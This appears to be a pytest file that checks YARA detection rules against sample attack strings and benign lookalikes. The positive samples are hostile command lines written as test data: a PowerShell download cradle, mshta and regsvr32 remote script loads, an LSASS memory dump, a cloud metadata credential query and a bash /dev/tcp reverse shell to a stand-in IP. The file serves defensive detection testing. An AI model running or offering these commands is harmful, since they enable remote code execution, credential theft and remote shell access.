from pathlib import Path

import pytest

yara = pytest.importorskip("yara")

RULES = Path(__file__).resolve().parents[1] / "rules" / "yara" / "memhalflife.yar"

POSITIVE = {
    "MemHL_PS_DownloadCradle": b"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/x')",
    "MemHL_Mshta_Remote_Script": b"mshta.exe http://192.0.2.10/p.hta",
    "MemHL_Regsvr32_Scriptlet": b"regsvr32 /s /n /u /i:http://192.0.2.10/x.sct scrobj.dll",
    "MemHL_WMI_EventConsumer": b"__EventFilter CommandLineEventConsumer",
    "MemHL_LSASS_Dump_Tooling": b"comsvcs.dll, MiniDump 664",
    "MemHL_Linux_IMDS_Credential_Query": b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/x",
    "MemHL_Linux_Memfd_Execution": b"/memfd:payload (deleted)",
    "MemHL_Linux_DevTcp_Reverse_Shell": b"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1",
}

BENIGN = [
    b"Get-ChildItem C:\\Users; powershell -Command Get-Date",
    b"ssh admin@host.example.com; curl https://example.com/index.html",
    b"regsvr32 /s C:\\Windows\\System32\\vbscript.dll",
    b"curl http://169.254.169.254/",  # bare metadata ping, no credential path
]


@pytest.fixture(scope="module")
def rules():
    return yara.compile(filepath=str(RULES))


@pytest.mark.parametrize("rule,data", POSITIVE.items())
def test_rule_fires(rules, rule, data):
    assert rule in {m.rule for m in rules.match(data=data)}


@pytest.mark.parametrize("data", BENIGN)
def test_benign_does_not_fire(rules, data):
    assert [m.rule for m in rules.match(data=data)] == []


def test_every_rule_has_attack_mapping(rules):
    text = RULES.read_text()
    assert text.count("rule MemHL_") == text.count("attack = \"T")
